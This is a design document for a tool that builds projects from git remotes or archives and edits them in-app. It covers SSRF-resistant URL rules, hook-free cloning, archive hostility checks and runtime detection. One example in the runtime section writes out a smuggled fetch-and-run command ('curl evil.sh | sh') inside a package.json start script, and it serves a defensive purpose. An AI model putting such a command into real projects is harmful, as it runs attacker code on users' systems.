# Remote sources and in-app editing

Two things a project can now do: come from somewhere else, and be edited here.

Unlike the other documents in this directory, this one describes code that
exists. Where something is not built, or is built but has never been run, it says
so.

---

## 1. Where a project's files come from

`SourceType` has seven values. Two are new:

| Source           | Meaning                                     | Reachable from the interface |
| ---------------- | ------------------------------------------- | ---------------------------- |
| `EMPTY`          | An empty directory                          | yes                          |
| `GIT_CLONE`      | Cloned from an HTTPS git remote             | yes                          |
| `GIT_CLONE`      | `owner/repo` via the host's `gh` login      | yes                          |
| `REMOTE_ARCHIVE` | Downloaded from an HTTPS `.zip` / `.tar.gz` | yes                          |
| `ZIP_UPLOAD`     | An uploaded archive                         | no — core only               |
| `LOCAL_FOLDER`   | A folder already on the machine             | no — core only               |
| `DUPLICATE`      | A copy of another project                   | no — core only               |
| `IMPORT_ARCHIVE` | A project export                            | no — core only               |

The last four are implemented in `file-manager` and have no interface. Adding one
is a variant in `provisioning::SourceSpec` and a radio button, not a redesign.

### The GitHub CLI option

A `GitHub CLI` source takes `owner/repo` (or a pasted github.com URL) and
authenticates with the token the user's own `gh` login already holds, so a private
repository clones with nothing typed into a token field. The dialog asks `gh`
whether it is installed and who is logged in _before_ offering the option, so a
user without it is told to install it or paste a token rather than meeting a
failure at Create.

**`gh repo clone` is not what runs.** That command shells out to `git`, which runs
the repository's hooks — a `post-checkout` hook in a repository someone was talked
into cloning would execute as that user. So `gh auth token` supplies the
credential and the fetch stays in-process through gix, which runs no hooks. The
`gh` login is what authenticates either way.

The URL is _built_ from the parsed owner and repo and then validated like any
other, so this path has no shortcut around §2. Names are checked against GitHub's
own character rules before `gh` is asked for anything: a URL pointing at a pull
request or a file is refused rather than guessing which repository it belongs to,
another host's URL is refused rather than becoming a github.com address, and
traversal never reaches a URL.

### Installing a CLI from GitHub

This is the case the sources were added for: paste
`https://github.com/owner/some-cli.git`, and the repository becomes a project.
What happens then is what happens to any project. Runtime detection reads the
fetched tree, decides Node, Python or static, and picks the install command;
**that command runs inside the project's container when it is built.**

Nothing from a fetched repository executes on the host. Not an install script,
not a git hook, not a `package.json` lifecycle script. This is the same promise
the product makes about every project, and remote sources do not weaken it.

---

## 2. What a URL has to survive

The application runs as the user. It can reach their loopback services, their
LAN, and on a cloud host the instance metadata endpoint. A URL a user can be
talked into pasting is therefore an attack surface, and `remote_url.rs` treats it
as one.

| Rule                                                                                                    | Why                                                                              |
| ------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- |
| Scheme must be exactly `https`                                                                          | `file://`, `git://`, `ssh://`, `data:` are all refused, as is an `http` hop      |
| No userinfo (`https://user:token@host/…`)                                                               | A token in a URL reaches log lines, error messages and the provenance column     |
| No resolved address in loopback, link-local, private, CGNAT, unique-local, multicast, or reserved space | The metadata endpoint `169.254.169.254` lives in link-local                      |
| IPv4-mapped IPv6 is unwrapped and checked as IPv4                                                       | `::ffff:127.0.0.1` is loopback wearing a hat                                     |
| **Any** bad address refuses the host, not just all of them                                              | A host answering with one public and one loopback address is a rebinding attempt |
| Every redirect target is re-validated and re-resolved                                                   | Otherwise only the first hop is ever checked                                     |
| Redirects capped at five                                                                                | Termination, not safety — a server may redirect in a loop                        |

A userinfo URL is **refused rather than stripped**: someone who pasted a token
into the address needs to be told it was not used, not left with an
authentication failure they cannot explain.

The rules are pure functions over strings and addresses, and resolution is behind
a trait, so every case above is an ordinary unit test — including the ones that
would otherwise need a hostile DNS server.

---

## 3. Cloning

`gix`, in-process. Shelling out to `git` was rejected twice over: it would add a
host prerequisite the product does not otherwise have, and `git clone` runs a
repository's hooks — a `post-checkout` hook in a repository a user was talked into
cloning would execute as that user. `gix` runs no hooks at all.

Three further decisions carry weight:

- **The repository is opened isolated.** The host's git configuration and
  environment are ignored, because a `url.<base>.insteadOf` rule in a user's
  global config can rewrite a URL — and no amount of validating the input string
  helps if the library rewrites it afterwards.
- **Submodules are not initialised.** A submodule is a URL inside the repository
  being cloned: a fetch of an attacker-chosen remote that never passed §2.
- **Shallow, depth 1.** One commit is what running a project needs, and it bounds
  the transfer.

Byte and time budgets are enforced _during_ the fetch, not after. A watcher
thread measures the staging directory as it grows and flips `gix`'s interrupt
flag, so a repository larger than the budget stops partway rather than filling the
disk and then being rejected.

`.git` is kept, so "update from remote" is possible later. It counts against the
byte budget.

**A commit id is not accepted as a ref.** Fetching an arbitrary object by id needs
the server's permission and most servers do not give it; the error says so
plainly rather than failing deep in the protocol. Branch and tag names work, and
the commit that was checked out is recorded either way.

---

## 4. Downloading an archive

The transport is one GET that follows no redirects — following them is the
caller's job, because each hop has to be validated before it is taken and a
client library that followed them internally would not do that.

- The byte cap applies to bytes actually received, not to `Content-Length`, which
  a server is free to lie about. An overrun deletes the partial file.
- **The archive is identified by its magic number, not by the URL's extension.**
  The extension is a claim by whoever wrote the URL; the first four bytes are a
  claim by the bytes that will actually be extracted.
- **A token is sent only to the host the user named.** Forwarding an
  `Authorization` header across a redirect hands the user's credential to whoever
  the first server chooses to point at. A redirect within the same host keeps it,
  so `/latest` → `/v1.2.3` still authenticates.

---

## 5. The hostility rule

**A fetched tree is exactly as hostile as an uploaded ZIP, and gets the same
treatment.** The same entry validation through `SafePath`, the same size, count
and ratio caps checked while extracting, the same refusal of symbolic links,
device nodes and setuid bits, into the same UUID-named staging directory, renamed
into place only on complete success.

A failure anywhere leaves no project and no staging directory. The staging
directory removes itself on drop rather than relying on every error path to
remember.

A cloned tree gets one extra check that an archive does not need: a symbolic link
that resolves outside the tree fails the clone. Links that stay inside it are
left alone, because real repositories contain them.

---

## 6. Tokens for private remotes

A token is encrypted with XChaCha20-Poly1305 and stored in
`project_source_credentials` — ciphertext, nonce, and no column a plaintext token
could occupy. `docs/database-schema.md` §6 has the table.

**Not built: the key store.** Nothing in this application holds an
`EncryptionKey` at runtime. The README has recorded this gap since Phase 5 — the
key management exists in `security`, the storage exists in `database`, and the
layer that joins them does not.

So the current behaviour is: a token authenticates the fetch and is then dropped.
The interface says so, in the field's own help text, rather than implying a secret
was kept safe somewhere. The encrypt-and-store path is written and tested against
real encryption; when a key store lands, the change is one argument at one call
site.

---

## 7. Editing

A file tree, tabs, and Monaco — the editing part of VS Code and none of the rest.
Out of scope deliberately: language servers, extensions, an integrated terminal,
and any git interface.

### The path invariant

Every file command takes a **project id and a path relative to that project's
root**. `SafePath` is built on the Rust side from a root the database supplied and
a string that can only ever be a suffix. The window has no way to express an
absolute path, a UNC path or a traversal.

This matters because the editor is the first feature with a real reason to want to
pass a full path, and the answer is still no. Symbolic links and Windows
junctions stay listable and deletable, and remain refused as the target of every
other operation.

### Behaviour

- Highlighting by extension. No language service, so no completions either — a
  suggestion widget with nothing behind it offers noise rather than help.
- Tabs with dirty markers, `Ctrl+S`, and a prompt before closing a dirty tab or
  leaving the view with unsaved buffers.
- Saves are atomic: a temporary file beside the target, then a rename over it.
- Files over 4 MiB and binary files (a NUL byte in the first 8 KiB) are refused
  with an explanation rather than opened as a garbled buffer.
- Read-only while the project is `BUILDING` or `DELETING`, where a write would
  either vanish into an image or corrupt what is being read.
- Editing a running project does not restart it. The view says a restart is
  needed rather than bouncing a container behind the user's back.

Three rules are worth stating because they are what the tests were written for:

- **A rename carries the buffer.** Otherwise the tab would point at a path that no
  longer exists, and its next save would recreate the old file.
- **Typing during a save leaves the buffer dirty.** The save wrote the older text;
  claiming otherwise loses the newer characters silently.
- **Deleting a directory closes the buffers inside it** — and only those. `src2/`
  is not inside `src/`.

### Monaco is bundled, not fetched

`@monaco-editor/react` was used first and removed. It loads the editor from
`cdn.jsdelivr.net` unless told otherwise, and even configured to use the bundled
copy it leaves that URL in the bundle: a code path that fetches the text editor
over the network, in a product whose offline behaviour is documented
(`offline-mode.md`). Monaco is now mounted directly, in about thirty lines, and
the built bundle contains no CDN reference — checked, not assumed. The web workers
are bundled too, so the language service does not silently fall back to the UI
thread.

---

## 8. What has actually been run

| Behaviour                                                        | Status                                              |
| ---------------------------------------------------------------- | --------------------------------------------------- |
| URL and address rules, including redirect chains                 | ✅ unit tested                                      |
| Entry rules for ZIP and tar.gz, caps, staging cleanup            | ✅ unit tested                                      |
| Clone and archive budgets, provenance, subdirectory traversal    | ✅ unit tested                                      |
| A real shallow clone over HTTPS from github.com                  | ✅ run by hand (`--ignored` network tests)          |
| A real archive download through GitHub's redirect to codeload    | ✅ run by hand                                      |
| A byte budget interrupting a clone in progress                   | ✅ run by hand                                      |
| A bad ref failing without leaving a project or staging directory | ✅ run by hand                                      |
| Migration v2 → v3 preserving a project and its child rows        | ✅ integration tested against SQLite                |
| Credential encryption, binding, and the schema's refusals        | ✅ integration tested                               |
| Tab, dirty-state and rename rules                                | ✅ 21 Vitest tests                                  |
| A symbolic link escaping a cloned tree                           | ❌ needs a session that may create symbolic links   |
| Storing a token                                                  | ❌ needs a key store, which is not built            |
| The editor on screen                                             | ❌ not seen; the bundle builds and the logic passes |

The network tests are `#[ignore]`d so `cargo test` does not depend on the
network:

```
cargo test -p project-host-file-manager --test remote_sources_network -- --ignored
```

---

## 9. Languages, and how one is chosen

### Thirteen runtimes

| Runtime      | Detected by                                     | Image                                      |
| ------------ | ----------------------------------------------- | ------------------------------------------ |
| `NODEJS`     | `package.json`                                  | `node:22.14.0-bookworm-slim`               |
| `TYPESCRIPT` | `package.json` + `tsconfig.json`                | two-stage node; ships without the compiler |
| `BUN`        | `bun.lockb`, `bunfig.toml`                      | `oven/bun:1.1.42-slim`                     |
| `DENO`       | `deno.json`, `deno.lock`                        | `denoland/deno:bin-2.1.4`                  |
| `PYTHON`     | `requirements.txt`, `pyproject.toml`, `Pipfile` | `python:3.12.8-slim-bookworm`              |
| `GO`         | `go.mod`                                        | builds on `golang`, ships on distroless    |
| `RUST`       | `Cargo.toml`                                    | builds on `rust`, ships on debian-slim     |
| `JAVA`       | `pom.xml`, `build.gradle`                       | builds on `maven`, ships on a JRE          |
| `PHP`        | `composer.json`, `index.php`                    | `php:8.3.15-cli-bookworm`                  |
| `RUBY`       | `Gemfile`, `config.ru`                          | `ruby:3.3.6-slim-bookworm`                 |
| `DOTNET`     | `*.csproj`, `*.fsproj`, `*.sln`                 | builds on the SDK, ships on the runtime    |
| `STATIC`     | `index.html`, incl. in `public/`                | `nginx:1.27.3-alpine`                      |
| `POLYGLOT`   | more than one of the above                      | Debian with several toolchains             |

### Detection is two questions, not one

`signals()` answers "what is in here" — a fact. It reads **marker files a
maintainer put there deliberately**, never a count of file extensions, because one
vendored script would otherwise outvote the actual project.

`detect()` then applies policy to that answer:

- **One language** gets that language's detector, which proposes a package
  manager, a start command and whether there is a lockfile.
- **Several languages** get `POLYGLOT` — an image carrying every toolchain the
  tree needs — rather than picking one and failing at build time on the other. The
  interface names what was found so a user who disagrees can override it.
- **None** is an error, not a default. Building a project as the wrong runtime
  produces a container that exits immediately, so the message names every marker
  file that was looked for.

Three precedence rules worth knowing: Deno and Bun beat Node when their own
manifests are present (nobody adds `deno.json` to a Node project); TypeScript is
its own runtime because a compile step is a different image, not a different
interpreter; and an `index.html` beside a real application is that application's
template, not a second project.

### What the user is asked

Nothing, for anything fetched. The dialog defaults to **Detect automatically** and
reports afterwards what the files turned out to be, along with any detection
warnings. "Choose it myself" lists all thirteen. An empty project has no files, so
it still asks — detection would only report finding nothing.

The list the interface offers comes from the same table the planner uses, so it
cannot offer a language that then fails at Create.

### What a project's own files can and cannot influence

Detection may choose **which** script runs. It never supplies the **text** of a
command: a `start` script becomes `<manager> run start`, so a `package.json`
containing `"start": "node s.js; curl evil.sh | sh"` produces `pnpm run start` and
the shell metacharacters stay inside the script, where the container's own
sandboxing applies. Every default command is a constant in `runtime_plan`.

### Images

Generated from the project's plan rather than from a fixed template, so a
repository whose start command is `npm run serve` gets an image that runs it.
Every one: a pinned base (never `:latest`), uid 10001 non-root, and
`CMD ["sh","-c","exec …"]` — the `exec` matters, because without it the shell
stays PID 1, swallows `SIGTERM`, and every stop waits out the kill timeout.
Compiled runtimes build in one stage and ship from another, so a service does not
carry a compiler.

The install step deliberately has no `|| true`. The templates this replaced ended
theirs with it, which turns a failed dependency install into a container that
starts and then fails obscurely.

**None of these images has ever been built.** There is no Docker daemon here.
Their _shape_ is asserted — pinned, non-root, multi-stage where it matters, valid
JSON in `CMD` — and their behaviour is unproven.
